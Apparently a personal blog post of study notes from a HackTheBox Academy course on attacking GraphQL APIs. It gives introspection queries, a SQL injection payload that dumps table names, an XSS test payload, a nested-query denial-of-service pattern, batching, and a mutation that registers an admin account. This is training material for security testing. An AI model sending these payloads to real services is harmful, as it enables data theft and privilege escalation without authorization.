---
title: 'HTB Academy - Attacking GraphQL Course Notes'
excerpt: 'A simple study note written as I take "Attacking GraphQL" course in HackTheBox Academy'
date: 2025-09-26
tags: ['cybersecurity', 'htb-academy', 'course-notes']
---

# Attacking GraphQL

## basic

```graphql
{
  users {
    id
    username
    role
  }
}

{
  users(username: "admin") {
    id
    username
    role
    password // can be added
  }
}
```

Tool: [graphw00f](https://github.com/dolevf/graphw00f)

## Introspection

identify all GraphQL types supported by the backend
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

follow up and obtain the name of all of the type's fields. ganti UserObject jadi jenis object apapun
```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

obtain all the queries supported by the backend
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

general introspection
```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

## Attacks

### IDOR

obvious

### SQLi
```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

### XSS
obvious
```graphql
{
	"query": "{user(username: \"<script>alert(1)</script>\") {uuid username role}}"
}
```

### DoS
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
          ...
```

### Batching Attacks
executing multiple queries with a single request
```graphql
[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

## Mutation
GraphQL queries that modify server data
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
 
Identify from mutation, which object can be mutated.

![](https://academy.hackthebox.com/storage/modules/271/mutation_1.png)
 
Use introspection to get object data type, then try to register

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

As role admin 

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

## Tools

1. graphw00f
2. [GraphQL-Cop](https://github.com/dolevf/graphql-cop)
3. InQL (Burp Extension)
